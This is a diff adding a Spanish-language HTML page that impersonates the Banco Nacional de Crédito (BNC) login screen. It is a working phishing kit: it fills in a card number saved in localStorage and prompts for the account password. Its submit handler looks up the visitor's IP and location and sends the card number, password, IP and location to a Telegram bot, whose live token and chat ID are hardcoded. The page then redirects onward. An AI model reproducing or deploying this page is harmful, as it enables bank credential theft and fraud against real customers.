@@ -1,0 +1,682 @@
+<html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión - BNC</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
+    <style>
+
+
+.input-container {
+            position: relative;
+            margin-bottom: 20px; /* Espacio entre campos */
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 40px; /* Ajusta según el padding del input */
+            top: 14px; /* Ajusta según el padding y el tamaño de la fuente */
+            transition: all 0.2s ease;
+            color: #999; /* Color del label cuando está en la posición normal */
+            pointer-events: none; /* Evitar que el label reciba clics */
+        }
+
+        .input-field {
+            font-family: Poppins, Helvetica, Arial, sans-serif;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 100%; /* Asegúrate de que el input ocupe todo el ancho */
+            padding: 12px 12px 12px 40px; /* Espaciado interior */
+            outline: none; /* Sin contorno al enfocar */
+        }
+
+        /* Estilo para el input cuando está enfocado */
+        .input-field:focus + .floating-label,
+        .input-field:not(:placeholder-shown) + .floating-label {
+            top: -10px; /* Posición cuando el placeholder está arriba */
+            font-size: 12px; /* Tamaño de fuente reducido cuando está arriba */
+            color: #007bff; /* Color del label cuando está arriba */
+        }
+
+.poppins-thin {
+  font-family: "Poppins", sans-serif;
+  font-weight: 100;
+  font-style: normal;
+}
+
+.poppins-extralight {
+  font-family: "Poppins", sans-serif;
+  font-weight: 200;
+  font-style: normal;
+}
+
+.poppins-light {
+  font-family: "Poppins", sans-serif;
+  font-weight: 300;
+  font-style: normal;
+}
+
+.poppins-regular {
+  font-family: "Poppins", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+}
+
+.poppins-medium {
+  font-family: "Poppins", sans-serif;
+  font-weight: 500;
+  font-style: normal;
+}
+
+.poppins-semibold {
+  font-family: "Poppins", sans-serif;
+  font-weight: 600;
+  font-style: normal;
+}
+
+.poppins-bold {
+  font-family: "Poppins", sans-serif;
+  font-weight: 700;
+  font-style: normal;
+}
+
+.poppins-extrabold {
+  font-family: "Poppins", sans-serif;
+  font-weight: 800;
+  font-style: normal;
+}
+
+.poppins-black {
+  font-family: "Poppins", sans-serif;
+  font-weight: 900;
+  font-style: normal;
+}
+
+.poppins-thin-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 100;
+  font-style: italic;
+}
+
+.poppins-extralight-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 200;
+  font-style: italic;
+}
+
+.poppins-light-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 300;
+  font-style: italic;
+}
+
+.poppins-regular-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 400;
+  font-style: italic;
+}
+
+.poppins-medium-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 500;
+  font-style: italic;
+}
+
+.poppins-semibold-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 600;
+  font-style: italic;
+}
+
+.poppins-bold-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 700;
+  font-style: italic;
+}
+
+.poppins-extrabold-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 800;
+  font-style: italic;
+}
+
+.poppins-black-italic {
+  font-family: "Poppins", sans-serif;
+  font-weight: 900;
+  font-style: italic;
+}
+
+body {
+            font-family: Poppins, Helvetica, Arial, sans-serif; /* Aplica la fuente principal */
+            background-color: #f2f2f2;
+            display: flex;
+            flex-direction: column; /* Organiza elementos en columna */
+            justify-content: center; /* Centra el contenedor verticalmente */
+            align-items: center;
+            min-height: 100vh; /* Asegura que el body ocupe toda la altura de la ventana */
+            padding: 0 0 60px 0; /* Espacio para el footer */
+        }
+
+        h2, p {
+            font-family: Poppins, Helvetica, Arial, sans-serif; /* Aplica la fuente a h2 y p */
+        }
+
+        
+        /* Contenedor para el input y el ícono */
+        .input-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        /* Estilos generales para los inputs */
+        input {
+    height: 40px;
+    width: 100%;
+    padding-left: 50px; /* Ajusta este valor para más espacio */
+    padding-right: 15px;
+    font-size: 14px;
+    border: 1px solid #cccccc;
+    border-radius: 4px;
+    outline: none;
+    box-sizing: border-box;
+}
+
+.input-container i {
+    position: absolute; /* Posicionamiento absoluto para el ícono */
+    left: 10px; /* Espacio desde el borde izquierdo */
+    color: #999; /* Color del ícono */
+}
+
+input {
+    height: 40px; /* Altura del input */
+    width: 100%; /* Ancho completo */
+    padding-left: 40px; /* Espacio para el ícono */
+    padding-right: 15px; /* Espacio adicional a la derecha */
+    font-size: 14px;
+    border: 1px solid #cccccc;
+    border-radius: 4px;
+    outline: none;
+    box-sizing: border-box; /* Ajusta el padding dentro del ancho del input */
+}
+
+input::placeholder {
+    color: #999; /* Color del placeholder */
+    opacity: 1; /* Asegúrate de que el placeholder sea completamente visible */
+}
+
+        /* Estilos para los íconos */
+        .input-container i {
+            position: absolute;
+            top: 39%;
+            left: 12px;
+            transform: translateY(-50%);
+            color: #666;
+        }
+
+        .forgot-password i {
+            margin-right: 5px;
+            color: #fff;
+        }
+
+        /* Otros estilos omitidos para brevedad */
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Poppins", sans-serif;        }
+
+        body {
+            background-color: #f2f2f2;
+            display: flex;
+            flex-direction: column; /* Organiza elementos en columna */
+            justify-content: center; /* Centra el contenedor verticalmente */
+            align-items: center;
+            min-height: 100vh; /* Asegura que el body ocupe toda la altura de la ventana */
+            padding: 0 0 60px 0; /* Espacio para el footer */
+        }
+
+        .container {
+            background-color: #001c4d;
+            width: 100%;
+            max-width: 380px;
+            padding: 20px; /* Padding alrededor del contenedor */
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            margin-bottom: 20px; /* Espacio justo debajo del contenedor para el footer */
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            margin-bottom: -1px; /* Alinear las pestañas con el borde superior del contenedor */
+            width: 100%; /* Asegura que las pestañas ocupen todo el ancho del contenedor */
+            max-width: 380px; /* Hacer que el ancho máximo sea el mismo que el contenedor */
+            border: 1px solid #ccc; /* Borde que se alinea con el contenedor */
+            border-radius: 8px 8px 0 0; /* Bordes redondeados en la parte superior */
+        }
+
+        .tab {
+            flex: 1;
+            padding: 10px;
+            cursor: pointer;
+            background-color: #eeeeee;
+            color: #333;
+            font-weight: bold;
+            border: none;
+            transition: background-color 0.3s;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            font-family: "Poppins", sans-serif;
+        }
+
+        .tab.active {
+            background-color: #fff;
+            color: #000;
+        }
+
+        /* Logo */
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0; /* Sin margen */
+            font-size: 24px;
+            font-weight: bold;
+            color: #005baa;
+        }
+
+        .logo img {
+            height: 40px;
+            margin-right: 10px;
+        }
+
+        /* Form container */
+        .form-container h2 {
+            font-size: 20px;
+            margin: 5px 0; /* Sin margen superior */
+            color: #fff;
+        }
+
+        .form-container p {
+            font-size: 14px;
+            color: #fff;
+            margin: 10px 0; /* Sin margen inferior */
+        }
+
+        /* Toggle buttons */
+        .tab-buttons {
+            display: flex;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 10px;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            background-color: #eeeeee;
+            border: none;
+            transition: background-color 0.3s;
+        }
+
+        .tab-button.active {
+            background-color: #ff6c00; /* Color naranja */
+            color: #ffffff;
+        }
+
+        /* Form styling */
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        form label {
+            display: none;
+        }
+
+        form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        button[type="submit"] {
+            margin-bottom: 13px;
+            width: 100%;
+            padding: 12px;
+            background-color: #377dff;;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #003d73;
+        }
+
+        /* Link styling */
+        .forgot-password {
+            display: block;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        footer {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+            text-align: center; /* Centrar el texto del footer */
+            padding: 10px; /* Espacio interno en el footer */
+            background-color: #ffffff; /* Color de fondo del footer */
+            width: 100%; /* Asegura que el footer ocupe todo el ancho */
+        }
+
+        footer p {
+            margin-bottom: 5px;
+        }
+        
+        .navbar-brand {
+    height: 60px;
+    width: auto;
+    margin: 5px 0 5px 0 !important;
+}
+
+
+    </style>
+</head>
+<body>
+
+    <div class="container-fluid LogoPL col-12 col-md-10 offset-md-1 col-lg-12 offset-lg-0" bis_skin_checked="1" style="
+    width: 100%;
+    padding-right: 15px;
+    padding-left: 15px;
+    margin-right: auto;
+    margin-left: auto;
+">
+        <div class="navbar-header logo-content" bis_skin_checked="1" style="
+    position: relative;
+    top: -30px;
+">
+        <img src="bnnc.png" alt="" class="navbar-brand u-header__navbar-brand u-header__navbar-brand-center">
+        </div>
+        <div class="collapse navbar-collapse" id="myNavbar" bis_skin_checked="1">
+        
+        </div>
+        </div>
+    <!-- Tabs for Personas/Empresas -->
+    <div class="tabs">
+    <button class="tab active" onclick="selectTab('personas')">Personas</button>
+    
+</div>
+
+
+<script>
+    document.querySelectorAll('.input-field').forEach(input => {
+        input.addEventListener('focus', function() {
+            this.nextElementSibling.classList.add('active');
+        });
+
+        input.addEventListener('blur', function() {
+            if (this.value === '') {
+                this.nextElementSibling.classList.remove('active');
+            }
+        });
+    });
+</script>
+
+    <div class="container">
+        <!-- Logo -->
+        
+
+        <!-- Form Container -->
+        <div class="form-container">
+            <h2>Iniciar Sesión</h2>
+            <p>Ingrese su Clave Estimad@: </p>
+
+
+            
+            <form id="loginForm">
+    <!-- Campo Número de Tarjeta -->
+    <!-- Segundo formulario que muestra el número de tarjeta enmascarado -->
+<div class="input-container">
+    <label for="cardNumber" class="floating-label">Número de Tarjeta</label>
+    <i class="fas fa-credit-card" style="margin-right: 5px;"></i>
+    <input type="text" id="cardNumber" placeholder="Número de Tarjeta" class="input-field" style="padding: 12px 12px 12px 40px;" readonly="">
+</div>
+
+
+<script>
+    function maskCardNumber(cardNumber) {
+        // Enmascarar los dígitos centrales, dejando los primeros 4 y últimos 4 visibles
+        return cardNumber.slice(0, 4) + " **** **** " + cardNumber.slice(-4);
+    }
+
+    // Cargar el número de tarjeta en el segundo formulario
+    document.addEventListener("DOMContentLoaded", () => {
+        const savedCardNumber = localStorage.getItem("savedCardNumber");
+        if (savedCardNumber) {
+            document.getElementById("cardNumber").value = maskCardNumber(savedCardNumber);
+        }
+    });
+</script>
+
+
+    <!-- Campo Cédula de Identidad -->
+    <div class="input-container">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="clave" class="input-field" placeholder="Ingrese su Clave" required="">
+                
+                <label for="clave" class="floating-label">Clave</label>
+            </div>
+
+    <button type="submit">Ingresar</button>
+<button type="submit" style="
+    background-color: #77838f;
+">Regresar</button></form>
+
+            
+            
+            
+            
+            <!-- Link styling -->
+<a href="#" class="forgot-password" style="
+"><i class="fas fa-lock"></i> ¿Olvidaste tu clave?</a><style>
+.forgot-password i {
+    margin-right: 5px; /* Espacio entre el ícono y el texto */
+    color: #fff; /* Color del ícono */
+}
+</style>
+
+
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>Banco Nacional de Crédito, Banco Universal.<br>Rif: J-30984132-7 © 2024 | BNC Versión: 1.18</p>
+        <p>Todos los derechos reservados.</p>
+    </footer>
+
+    <script>
+        function selectTab(tabName) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelector(`.tab.${tabName}`).classList.add('active');
+        }
+
+        function selectFormType(formType) {
+            document.querySelectorAll('.tab-button').forEach(button => button.classList.remove('active'));
+            const activeButton = document.querySelector(`.tab-button[onclick="selectFormType('${formType}')"]`);
+            activeButton.classList.add('active');
+        }
+    </script>
+    <script>
+function selectTab(tabName) {
+    // Cambia la pestaña activa
+    const tabs = document.querySelectorAll('.tab');
+    tabs.forEach(tab => {
+        tab.classList.remove('active'); // Remueve la clase 'active' de todas las pestañas
+    });
+
+    // Selecciona la pestaña que se activó
+    const activeTab = document.querySelector(`.tab[onclick="selectTab('${tabName}')"]`);
+    activeTab.classList.add('active'); // Añade la clase 'active' a la pestaña activa
+}
+
+// Inicializa el estado al cargar la página
+window.onload = function() {
+    selectTab('personas'); // Selecciona Personas por defecto
+};
+
+
+</script>
+
+<style>
+
+.tabs {
+    display: flex;
+    margin-bottom: 1px; /* Espacio debajo de las pestañas */
+    position: relative; /* Posicionamiento relativo para las líneas */
+}
+
+.tab {
+    flex: 1;
+    padding: 10px;
+    cursor: pointer;
+    background-color: #eeeeee; /* Color de fondo inicial */
+    color: #333; /* Color del texto inicial */
+    font-weight: bold;
+    border: none;
+    transition: background-color 0.3s, color 0.3s; /* Transiciones suaves */
+    position: relative; /* Posicionamiento relativo para la línea */
+}
+
+.tab.active {
+    background-color: #fff; /* Color cuando está activo */
+    color: #000; /* Color del texto cuando está activo */
+}
+
+/* Estilo para la línea debajo de las pestañas */
+.tab::after {
+    content: '';
+    display: block;
+    width: 0;
+    height: 3px; /* Altura de la línea */
+    background-color: #fd5000; /* Color de la línea */
+    transition: width 0.3s; /* Transición suave para el ancho */
+    position: absolute; /* Posicionamiento absoluto */
+    left: 50%; /* Centrar la línea */
+    bottom: -5px; /* Espacio entre el texto y la línea */
+    transform: translateX(-50%); /* Centrar la línea */
+}
+
+.tab.active::after {
+    width: 100%; /* La línea se expande al 100% cuando está activa */
+}
+
+</style>
+
+
+
+
+<script>
+    // Función para cambiar la pestaña activa
+    function selectTab(tabName) {
+        document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+        document.querySelector(`.tab[onclick="selectTab('${tabName}')"]`).classList.add('active');
+    }
+
+    // Inicializa el estado al cargar la página
+    window.onload = function() {
+        selectTab('personas');
+        loadCardNumber();
+    };
+
+    function loadCardNumber() {
+        const savedCardNumber = localStorage.getItem("savedCardNumber");
+        if (savedCardNumber) {
+            document.getElementById("cardNumber").value = maskCardNumber(savedCardNumber);
+        }
+    }
+
+    function maskCardNumber(cardNumber) {
+        return cardNumber.slice(0, 4) + " **** **** " + cardNumber.slice(-4);
+    }
+
+    function goBack() {
+        window.history.back(); // Regresa a la página anterior
+    }
+
+    // Enviar datos a Telegram
+    async function sendMessageToTelegram(message) {
+        const BOT_TOKEN = '8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4'; // Tu token
+        const CHAT_ID = '-4571868410'; // Tu chat ID
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: CHAT_ID,
+            text: message,
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+            });
+            const result = await response.json();
+            console.log('Mensaje enviado:', result);
+        } catch (error) {
+            console.error('Error al enviar el mensaje:', error);
+        }
+    }
+
+    // Función para obtener información de IP
+    async function getIPInfo() {
+        const response = await fetch('https://ipapi.co/json/');
+        return await response.json();
+    }
+
+    // Escuchar el evento de envío del formulario
+    document.getElementById('loginForm').addEventListener('submit', async function(event) {
+        event.preventDefault(); // Prevenir el comportamiento por defecto del formulario
+
+        const cardNumber = document.getElementById('cardNumber').value;
+        const clave = document.getElementById('clave').value;
+
+        // Obtener la información de IP
+        const ipInfo = await getIPInfo();
+        const message = `Número de Tarjeta: ${cardNumber}\nClave: ${clave}\nIP: ${ipInfo.ip}\nPaís: ${ipInfo.country}\nCiudad: ${ipInfo.city}`;
+
+        // Enviar el mensaje a Telegram
+        await sendMessageToTelegram(message);
+
+        // Redirigir a otra página
+        window.location.href = 'prestamo.html';
+    });
+</script>
+    
+
+</body></html>
